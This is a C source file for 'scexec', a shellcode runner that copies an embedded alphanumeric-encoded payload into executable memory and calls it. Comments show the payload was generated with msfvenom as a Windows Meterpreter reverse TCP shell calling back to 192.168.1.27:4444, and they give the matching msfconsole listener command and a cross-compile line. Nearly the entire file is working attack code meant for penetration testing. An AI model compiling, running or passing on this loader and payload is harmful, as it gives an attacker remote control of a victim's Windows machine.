/*
	scexec - Portable utility to execute in memory a sequence of opcodes
	Vlatko Kosturjak, vlatko.kosturjak@gmail.com
	Based on Bernardo Damele A. G. shellcodeexecute
*/

#include <sys/types.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

/* Microsoft Visual Studio have different way of specifying variable number of args */
#ifdef DEBUG
 #ifdef _MSC_VER
 #define DEBUG_PRINTF(fmt, ...) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, __LINE__, __FUNCTION__, __VA_ARGS__)
 #else
 #define DEBUG_PRINTF(fmt, args...) fprintf(stderr, "%s:%d:%s(): " fmt, __FILE__, __LINE__, __FUNCTION__, ##args)
 #endif
#else
 #ifdef _MSC_VER
 #define DEBUG_PRINTF(fmt, ...)
 #else
 #define DEBUG_PRINTF(fmt, args...)
 #endif
#endif

#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
#include <windows.h>
#else

#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#endif



int sys_bineval(unsigned char *argv, size_t len);
void call_handler (void *payload);

int main(int argc, char *argv[])
{
	size_t len;

	unsigned char SHELLCODE[] = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA";

	len = (size_t)strlen(SHELLCODE);
	sys_bineval(SHELLCODE, len);

	exit(0);
}



int sys_bineval(unsigned char *buf, size_t len)
{

	unsigned char *argv=buf;
	unsigned char *tempbuf=NULL;
	unsigned char *winmem;

	// allocate a +rwx memory page
	DEBUG_PRINTF("Allocating RWX memory...\n");
	winmem = (char *) VirtualAlloc(NULL, len+1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// copy over the shellcode
	DEBUG_PRINTF("Copying shellcode\n");
	memcpy(winmem, argv, len+1);

	DEBUG_PRINTF("Freeing temporary buffer\n");
	if (tempbuf!=NULL) {
		free(tempbuf);
	}

	//call_handler (winmem);

	DEBUG_PRINTF("Executing payload32\n");
	__asm__ (
		"mov %0, %%eax\n"
		"call *%%eax\n"
		: // no output
		: "m"(winmem) // input
	);

	DEBUG_PRINTF("Returning from execute function\n");
	return 0;
}



// msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -e x86/alpha_mixed -f raw LHOST=192.168.1.27 LPORT=4444 EXITFUNC=thread BufferRegister=EAX
// msfconsole -x 'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; run'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA

// make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe
// PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIkLyxnbGpuP5Pu0k98eP1o03TlKpPFPnkqB6lnkPRdTnkPr5x4OmgQZ4ftqiollUl51sLWrDlq0yQhOFmWqO7Xbl2Brf7lKF2DPLK0JElLKPLb1SHHcBhUQzqv1nkRyGPs1ZsLKbi5HisgJRinkFTnks1n6FQioLlYQHODMC19W6XM0qeIfC3QmIhUkqm141eYt0XLK0XvDUQHS0fLKflrkNkf85LUQjsnkgtlKuQzplIG4vDVDQKSksQ0Ysj2qKOip3oqOBznkGbhkNmCm58037BgpwpcXbWacDrCo64SXPLRW6FEW9oYEMhj0Vas030WY9Tv4rpPhVIk0RKc0KOxUazDJu89POX7quKRH7r7p6qQLlIxfF0PPV0pPw0BpspF0phIzFoKoypYoZuog3ZtPPVF7phZ9Y5CDCQYoHULEO0cDwzYoPNFhaeZLixqq7pGpWpqz30SZ4Dbvf7cXGrjyzhaOKOyEnc8xgpCNEfnkGFQzqPSXuPVpWpuPcfpjS0Ph1H941C8e9oYEZ3qCQzs0QFF3CgU8WrxYiXco9oxUmSKHC0cMdbF8QxuPw0s0UP2JGpV0QxDKToTO4pKO9E1Gph1ePnBm1qiohUcn1NYoFlgTxit1yoIokOeQYSfIO6PuO7o3oKipUM5zVj0hoVZ5OMOmyoyE5lwvalFjk0IkM0CE4EmkswECabBO0j5Pf3yoZuAA